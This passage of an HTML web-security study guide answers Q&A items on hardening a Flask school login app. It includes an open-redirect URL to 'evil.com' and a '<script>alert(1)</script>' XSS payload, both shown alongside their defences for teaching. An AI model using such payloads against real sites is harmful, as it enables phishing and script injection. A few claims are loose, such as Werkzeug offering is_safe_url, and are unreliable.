<strong>Scenario</strong>: Login page redirects to <code>next</code> parameter.
<code>https://school.com/login?next=http://evil.com</code>.
User logins -&gt; Redirected to Evil keys -&gt; Phishing.
<strong>Fix</strong>: Validate that <code>next</code> is a relative URL (<code>/dashboard</code>) or matches our domain. Werkzeug offers <code>is_safe_url</code> helper.</p>
<hr />
<p><strong>Q80: Code: <code>safe_url</code> logic.</strong></p>
<p><strong>Complete Answer</strong>:</p>
<pre><code class="language-python">from urllib.parse import urlparse, urljoin
def is_safe_url(target):
    ref_url = urlparse(request.host_url)
    test_url = urlparse(urljoin(request.host_url, target))
    return test_url.scheme in ('http', 'https') and ref_url.netloc == test_url.netloc
</code></pre>
<hr />
<p><strong>Q81: Logic: How do we securely logout?</strong></p>
<p><strong>Complete Answer</strong>:
Call <code>logout_user()</code>.
This deletes the Session Cookie from the browser.
<strong>Crucial</strong>: The session should also be invalidated server-side if using server-side sessions. Since we use cookies, deleting it is sufficient (unless attacker saved a copy, then we rely on expiry).</p>
<hr />
<p><strong>Q82: Security: What if Database is Leaked?</strong></p>
<p><strong>Complete Answer</strong>:
Assume the worst: SQL dump is public.
1.  <strong>Passwords</strong>: Hashed with Scrypt. Safe from immediate use.
2.  <strong>Emails</strong>: Leaked. Spam risk.
3.  <strong>Names</strong>: Leaked. Privacy breach.
<strong>Defense</strong>: Encrypt specific columns (PII) at application level (Advanced). Minimization (don't store DOB if not needed).</p>
<hr />
<p><strong>Q83: Vulnerability: XSS in 'Bio' field.</strong></p>
<p><strong>Complete Answer</strong>:
If Tutors can write a "Bio" and we render it.
<strong>Input</strong>: <code>Hello &lt;script&gt;alert(1)&lt;/script&gt;</code>.
<strong>Output</strong>: Script executes on parent's browser.
<strong>Defense</strong>: Jinja2 Auto-escaping. It renders <code>&amp;lt;script&amp;gt;</code>.
If we needed rich text, we would use a library like <code>Bleach</code> to sanitize allowed tags (<code>&lt;b&gt;</code>, <code>&lt;i&gt;</code>) and strip scripts.</p>
<hr />
<p><strong>Q84: Explain "Hash Collision".</strong></p>
<p><strong>Complete Answer</strong>:
Two different inputs producing same hash.
MD5 has collisions.
SHA-256 / Scrypt theoretically have collisions but probability is effectively zero.
<strong>Impact</strong>: If collision found, attacker can spoof password. Hence using modern strong hashes.</p>
<hr />
<p><strong>Q85: Security: Dependency Vulnerabilities.</strong></p>
<p><strong>Complete Answer</strong>:
What if <code>Flask-Login</code> has a bug?
<strong>Defense</strong>:
Dependabot / Snyk.
Tools scans <code>requirements.txt</code> against CVE (Common Vulnerabilities and Exposures) database.
We must update python packages regularly.</p>
<hr />
<p><strong>Q86: Code: <code>validate_on_submit()</code>.</strong></p>
<p><strong>Complete Answer</strong>:
Method in Flask-WTF.
Checks:
1.  Request is POST.
2.  CSRF Token is valid.
3.  All field validators (Email, DataRequired) pass.
Returns <code>True</code> only if safe to proceed.</p>
<hr />
<p><strong>Q87: Design: What is OAuth?</strong></p>
<p><strong>Complete Answer</strong>:
"Login with Google".
<strong>Mechanism</strong>:
We delegate authentication to Google. Google restricts access and sends us a token.
<strong>Benefit</strong>: We don't handle passwords.
<strong>Drawback</strong>: Complexity. Reliance on Google (if Google down, nobody logs in).</p>
<hr />
<p><strong>Q88: Security: DoS (Denial of Service).</strong></p>
<p><strong>Complete Answer</strong>:
Attacker floods server.
<strong>Application Defense</strong>:
-   Expensive operations (Hashing) take CPU.
-   Attacker sends random login requests. CPU spikes.
-   Defense: Rate Limiting (Flask-Limiter) and Captcha.</p>
<hr />
<p><strong>Q89: Logic: Admin creation.</strong></p>
<p><strong>Complete Answer</strong>:
Admins should not be able to register publicly.
<strong>Strategy</strong>:
1.  Seed script: <code>python manage.py create_admin</code>.
2.  Route protected by <code>@admin_required</code>: Existing admin can create new admin.</p>
<hr />
<p><strong>Q90: Security: URL Parameters vs Body.</strong></p>
<p><strong>Complete Answer</strong>:
Never put sensitive data in URL (<code>/login?pass=123</code>).
<strong>Why</strong>: URLs are saved in Browser History, Proxy Logs, Server Access Logs.
<strong>Correct</strong>: Use POST body (encrypted in HTTPS, not logged).</p>
<hr />
<p><strong>Q91: Explain "Privilege Escalation".</strong></p>
<p><strong>Complete Answer</strong>:
User finding a way to become Admin.
<strong>Vertical</strong>: Low role to High role.
<strong>Horizontal</strong>: Accessing another user's data (IDOR).
<strong>Defense</strong>: Strict testing of <code>@admin_required</code> on every sensitive route.</p>
<hr />
<p><strong>Q92: Troubleshooting: "400 Bad Request: CSRF Token Missing".</strong></p>
<p><strong>Complete Answer</strong>:
<strong>Cause</strong>:
1.  Forgot <code>{{ form.hidden_tag() }}</code> in template.
2.  Session expired (Token gone).
3.  Cookies disabled.
<strong>Fix</strong>: Add tag, ensure cookies enabled.</p>
<hr />
<p><strong>Q93: Security: Input Validation.</strong></p>
<p><strong>Complete Answer</strong>:
Sanitize everything coming from outside.
-   <code>int(id)</code>: Ensures ID is number.
-   <code>trim()</code> string.
-   Whitelist values (<code>role</code> in <code>['admin', 'parent']</code>).</p>
<hr />
<p><strong>Q94: Design: Secret Key Rotation.</strong></p>
<p><strong>Complete Answer</strong>:
If <code>SECRET_KEY</code> is compromised.
1.  Change Key in config.
2.  <strong>Impact</strong>: All existing sessions become invalid immediately. Users logged out.
This is a feature, not a bug (Kill switch).</p>
<hr />
<p><strong>Q95: Code: <code>DataRequired</code> vs <code>InputRequired</code>.</strong></p>
<p><strong>Complete Answer</strong>:
Flask-WTF validators.
-   <code>DataRequired</code>: Checks content exists AND is not whitespace strings.
-   <code>InputRequired</code>: Just checks input was sent.
<strong>Choice</strong>: <code>DataRequired</code> prevents "   " as a name.</p>
<hr />
<p><strong>Q96: Security: HTTP Verbs.</strong></p>
<p><strong>Complete Answer</strong>:
Using GET for state-changing actions (<code>/delete?id=1</code>) is dangerous (CSRF, crawlers triggering it).
<strong>Rule</strong>: GET for read. POST/PUT/DELETE for write.</p>
<hr />
<p><strong>Q97: Security: Error Messages.</strong></p>
<p><strong>Complete Answer</strong>:
Production 500 Page.
Should say: "Internal Error".
Should NOT say: <code>KeyError at line 50: 'password'</code>.
<strong>Why</strong>: Stack trace helps attacker understand code structure.</p>
<hr />
<p><strong>Q98: Code: String Comparison.</strong></p>
<p><strong>Complete Answer</strong>:
<code>if user.role == 'admin'</code>:
Python string comparison is safe.
For crypto strings (tokens), use <code>hmac.compare_digest</code>.</p>
<hr />
<p><strong>Q99: Security: CAPTCHA.</strong></p>
<p><strong>Complete Answer</strong>:
Completely Automated Public Turing test to tell Computers and Humans Apart.
<strong>Use</strong>: On Registration / Login.
<strong>Prevents</strong>: Automated bots. (Google Recaptcha v3 is invisible/scoring based).</p>
<hr />
<p><strong>Q100: Final Review: Security vs Usability.</strong></p>
<p><strong>Complete Answer</strong>:
Security is always a trade-off.
-   Too strict (20 char passwords, 2FA, 5 min timeout) = User frustration.
-   Too loose (No CSRF, weak password) = Hacked.
<strong>Balance</strong>: We optimized for a school context (Standard security, persistent sessions for convenience, but strong backend locking).</p>
            </body>
            </html>
            